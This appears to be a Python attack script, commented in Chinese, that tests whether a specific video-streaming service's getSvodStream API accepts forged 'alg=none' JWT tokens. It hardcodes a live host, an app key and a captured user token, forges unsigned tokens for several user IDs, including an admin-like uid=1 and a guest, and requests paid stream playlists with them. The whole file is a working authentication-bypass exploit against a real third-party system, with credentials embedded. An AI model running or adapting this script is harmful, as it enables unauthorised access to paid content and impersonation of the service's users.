# -*- coding: utf-8 -*-
"""决定性实验：alg=none 伪造 token 是否被 getSvodStream 采信"""
import json, base64, urllib.request, urllib.parse, time

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"

def b64(d):
    return base64.urlsafe_b64encode(d).decode().rstrip("=")

def mk(uid, alg="none", secret=None):
    h = b64(json.dumps({"typ": "JWT", "alg": alg}, separators=(",", ":")).encode())
    p = b64(json.dumps({"uid": uid, "iat": int(time.time()),
                        "exp": int(time.time()) + 2592000,
                        "nonce": "deadbeefdeadbeef", "v": 1}, separators=(",", ":")).encode())
    if alg == "none":
        return h + "." + p + "."
    import hmac, hashlib
    sig = hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64(sig)

def stream(vid, uid, tok, which="getSvodStream", param="vid"):
    q = "%s/stream/index.m3u8?%s=%s&uid=%s&token=%s&_t=%d" % (which, param, vid, uid, tok, int(time.time() * 1000))
    url = API + "/" + which + "/appkey/" + KEY + "/" + q
    hdr = {"User-Agent": "okhttp/3.12.0"}
    if tok:
        hdr["token"] = tok
    r = urllib.request.Request(url, headers=hdr)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read()[:80]
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:120]
    except Exception as e:
        return -1, str(e).encode()

REAL = "eyJ1aWQiOjk0OTcwLCJpYXQiOjE3OTUzNjg2MjAsImV4cCI6MTc5Nzk2MDYyMCwibm9uY2UiOiJiNTQ5YzY4ZDQ3OTA3Y2M5IiwidiI6MX0.9373ed25bfd0883595f85ab8db9ee773ebf6f4a8540b582baf0d3d02732fe3bc"

cases = [
    ("real token, uid=94970 (owns 821)", 821, "94970", REAL),
    ("alg=none uid=94970", 821, "94970", mk(94970)),
    ("alg=none uid=64387 (guest)", 821, "64387", mk(64387)),
    ("alg=none uid=1", 821, "1", mk(1)),
    ("alg=none uid=94970, query uid=64387", 821, "64387", mk(94970)),
]
for tag, vid, uid, tok in cases:
    st, body = stream(vid, uid, tok)
    print("%-38s -> %s %s" % (tag, st, body[:70]))
